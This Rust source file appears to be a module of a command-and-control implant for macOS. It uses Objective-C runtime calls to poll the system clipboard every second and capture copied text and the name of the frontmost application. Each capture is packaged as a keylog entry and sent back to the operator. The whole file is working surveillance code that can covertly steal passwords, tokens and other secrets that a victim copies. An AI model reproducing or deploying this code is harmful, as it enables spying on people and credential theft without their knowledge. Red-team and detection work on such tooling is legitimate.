use crate::structs::{Keylog, Task};
use crate::utils::get_user;
use serde::Deserialize;
use std::ffi::{c_void, CStr};

#[derive(Deserialize)]
struct ClipboardMonitorArgs {
    #[serde(default = "default_duration")]
    duration: i32,
}

fn default_duration() -> i32 {
    -1
}

extern "C" {
    fn objc_getClass(name: *const u8) -> *mut c_void;
    fn sel_registerName(name: *const u8) -> *mut c_void;
    fn objc_msgSend(obj: *mut c_void, sel: *mut c_void, ...) -> *mut c_void;
}

unsafe fn get_clipboard_change_count() -> i64 {
    let pasteboard_class = objc_getClass(b"NSPasteboard\0".as_ptr());
    let general_sel = sel_registerName(b"generalPasteboard\0".as_ptr());
    let pasteboard = objc_msgSend(pasteboard_class, general_sel);
    let count_sel = sel_registerName(b"changeCount\0".as_ptr());
    objc_msgSend(pasteboard, count_sel) as i64
}

unsafe fn get_clipboard_contents() -> String {
    let pasteboard_class = objc_getClass(b"NSPasteboard\0".as_ptr());
    let general_sel = sel_registerName(b"generalPasteboard\0".as_ptr());
    let pasteboard = objc_msgSend(pasteboard_class, general_sel);

    let nsstring_class = objc_getClass(b"NSString\0".as_ptr());
    let type_sel = sel_registerName(b"stringWithUTF8String:\0".as_ptr());
    let pb_type = objc_msgSend(
        nsstring_class,
        type_sel,
        b"public.utf8-plain-text\0".as_ptr(),
    );

    let string_sel = sel_registerName(b"stringForType:\0".as_ptr());
    let result = objc_msgSend(pasteboard, string_sel, pb_type);
    if result.is_null() {
        return String::new();
    }

    let utf8_sel = sel_registerName(b"UTF8String\0".as_ptr());
    let cstr_ptr = objc_msgSend(result, utf8_sel) as *const i8;
    if cstr_ptr.is_null() {
        return String::new();
    }

    CStr::from_ptr(cstr_ptr).to_string_lossy().to_string()
}

unsafe fn get_frontmost_app() -> String {
    let workspace_class = objc_getClass(b"NSWorkspace\0".as_ptr());
    let shared_sel = sel_registerName(b"sharedWorkspace\0".as_ptr());
    let workspace = objc_msgSend(workspace_class, shared_sel);

    let frontmost_sel = sel_registerName(b"frontmostApplication\0".as_ptr());
    let app = objc_msgSend(workspace, frontmost_sel);
    if app.is_null() {
        return String::new();
    }

    let name_sel = sel_registerName(b"localizedName\0".as_ptr());
    let name = objc_msgSend(app, name_sel);
    if name.is_null() {
        return String::new();
    }

    let utf8_sel = sel_registerName(b"UTF8String\0".as_ptr());
    let cstr_ptr = objc_msgSend(name, utf8_sel) as *const i8;
    if cstr_ptr.is_null() {
        return String::new();
    }

    CStr::from_ptr(cstr_ptr).to_string_lossy().to_string()
}

pub async fn execute(task: Task) {
    let mut response = task.new_response();
    let args: ClipboardMonitorArgs = match serde_json::from_str(&task.data.params) {
        Ok(a) => a,
        Err(e) => {
            response.set_error(&format!("Failed to parse: {}", e));
            let _ = task.job.send_responses.send(response).await;
            let _ = task.remove_running_task.send(task.data.task_id.clone()).await;
            return;
        }
    };

    let mut elapsed = 0;
    let mut last_count = unsafe { get_clipboard_change_count() };

    loop {
        if args.duration >= 0 && elapsed >= args.duration {
            break;
        }
        if task.should_stop() {
            break;
        }

        tokio::time::sleep(std::time::Duration::from_secs(1)).await;
        elapsed += 1;

        let current_count = unsafe { get_clipboard_change_count() };
        if current_count != last_count {
            last_count = current_count;
            let contents = unsafe { get_clipboard_contents() };
            if !contents.is_empty() {
                let window_title = unsafe { get_frontmost_app() };
                let mut msg = task.new_response();
                msg.user_output = format!("{}\n", contents);
                msg.keylogs = Some(vec![Keylog {
                    user: get_user(),
                    window_title,
                    keystrokes: contents,
                }]);
                let _ = task.job.send_responses.send(msg).await;
            }
        }
    }

    response.completed = true;
    response.user_output = "\n\n[*] Finished Monitoring".to_string();
    let _ = task.job.send_responses.send(response).await;
    let _ = task.remove_running_task.send(task.data.task_id.clone()).await;
}
